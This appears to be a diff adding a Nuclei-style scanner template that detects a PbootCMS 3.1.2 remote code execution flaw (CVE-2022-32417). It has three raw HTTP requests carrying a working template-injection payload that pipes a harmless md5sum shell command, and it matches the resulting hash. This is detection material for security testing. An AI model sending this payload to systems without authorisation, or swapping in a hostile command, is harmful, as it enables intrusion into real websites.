@@ -1,0 +1,63 @@
+id: pbootcms-rce-cve-2022-32417
+info:
+  name: PbootCMS Remote Code Execution (CVE-2022-32417)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    PbootCMS is an open-source enterprise website content management system (CMS) developed
+    by PbootCMS personal developers using PHP language. There is a security vulnerability in
+    PbootCMS version 3.1.2, through which an attacker can cause remote code execution.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2022-32417
+  classification:
+    cve-id: CVE-2022-32417
+    cvss-score: 9.0
+
+http:
+  - raw:
+      - |
+        GET /?member/login/?suanve=}{pboot:if((get_lg/*suanve-*/())/**/(get_backurl/*suanve-*/()))}123321suanve{/pboot:if}&backurl=;aodvc|md5sum HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PbootSystem=qndt58bje3pulluvsp8g2krv4u;lg=system
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "d41d8cd98f00b204e9800998ecf8427e"
+
+  - raw:
+      - |
+        GET /index.php/keyword?keyword=}{pboot:if((get_lg/*suanve-*/())/**/(get_backurl/*suanve-*/()))}123321suanve{/pboot:if}&backurl=;aodvc|md5sum HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PbootSystem=qndt58bje3pulluvsp8g2krv4u;lg=system
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "d41d8cd98f00b204e9800998ecf8427e"
+
+  - raw:
+      - |
+        GET /index.php/?suanve=}{pboot:if((get_lg/*suanve-*/())/**/(get_backurl/*suanve-*/()))}123321suanve{/pboot:if}&backurl=;aodvc|md5sum HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PbootSystem=qndt58bje3pulluvsp8g2krv4u;lg=system
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "d41d8cd98f00b204e9800998ecf8427e"
